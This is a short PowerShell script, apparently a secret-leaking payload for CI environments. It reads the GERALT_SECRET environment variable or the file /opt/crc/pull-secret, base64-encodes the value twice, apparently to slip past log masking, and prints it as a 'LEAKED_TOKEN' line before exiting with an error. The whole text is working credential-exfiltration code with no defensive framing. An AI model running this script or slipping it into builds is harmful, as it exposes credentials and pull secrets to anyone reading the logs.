$s = $env:GERALT_SECRET
if ($s) {
  $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s))
  $b64b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($b64))
  Write-Output "GERALT_LEAKED_TOKEN=$b64b64"
}
if (-not $s) {
  try {
    $ps = Get-Content -Raw -ErrorAction Stop '/opt/crc/pull-secret'
    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ps))
    $b64b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($b64))
    Write-Output "GERALT_LEAKED_TOKEN=$b64b64"
  } catch { }
}
exit 1
